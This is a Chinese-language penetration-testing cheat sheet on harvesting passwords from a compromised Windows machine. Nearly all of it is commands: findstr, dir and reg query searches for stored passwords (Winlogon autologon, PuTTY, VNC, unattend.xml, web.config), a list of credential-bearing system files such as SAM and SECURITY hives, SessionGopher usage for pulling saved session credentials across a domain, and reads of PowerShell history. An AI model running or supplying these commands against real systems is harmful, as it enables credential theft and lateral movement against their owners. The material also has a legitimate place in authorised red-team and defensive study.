# 针对密码-从文件中发现密码

[****SAM 和SYSTEM 文件位置-及其利用**** ](%E9%92%88%E5%AF%B9%E5%AF%86%E7%A0%81-%E4%BB%8E%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%AF%86%E7%A0%81%2047c2d8b209c044e9b735a1f70ebd70e9/SAM%20%E5%92%8CSYSTEM%20%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE-%E5%8F%8A%E5%85%B6%E5%88%A9%E7%94%A8%20f0e81d96f3ba46afab6b3981f780e28d.md)

[****win10/win11 下HiveNightmare（CVE-2021–36934）可以使非管理员得到SAM,SECURITY,SYSTEM文件****](%E9%92%88%E5%AF%B9%E5%AF%86%E7%A0%81-%E4%BB%8E%E6%96%87%E4%BB%B6%E4%B8%AD%E5%8F%91%E7%8E%B0%E5%AF%86%E7%A0%81%2047c2d8b209c044e9b735a1f70ebd70e9/win10%20win11%20%E4%B8%8BHiveNightmare%EF%BC%88CVE-2021%E2%80%9336934%EF%BC%89%E5%8F%AF%E4%BB%A5%E4%BD%BF%E9%9D%9E%E7%AE%A1%E7%90%86%E5%91%98%E5%BE%97%2061e11edfdd214726842d244350543503.md)

## **从文件内容中寻找到关于密码的线索：**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

## **搜索具有某个带有密码文件名的文件：**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

## **从注册表中寻找密码：**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"    在自动登录中寻找
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"    发现putty程序的明文密码
reg query "HKCU\Software\ORL\WinVNC3\Password"    发现VNC程序的明文密码，下面也是
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password  
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## **在unattend.xml 中的密码发现**

```bash
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

## **从IIS Web config 中发现密码**

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`

`C:\inetpub\wwwroot\web.config`****

## **其他文件中发现密码**

```bash
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b
```

## 其他会话密码：

‣ **它可以从从WinSCP, PuTTY, SuperPuTTY, FileZilla, 和 Microsoft Remote Desktop 中发现密码**

使用方法：

```bash
. .\SessionGopher.ps1
Invoke-SessionGopher -Thorough     **本地使用**
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss  **远程使用,-u,p 是凭据 
Invoke-SessionGopher -AllDomain -o  写入CSV文件中**
```

## **从powershell历史记录中发现密码**

```bash
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```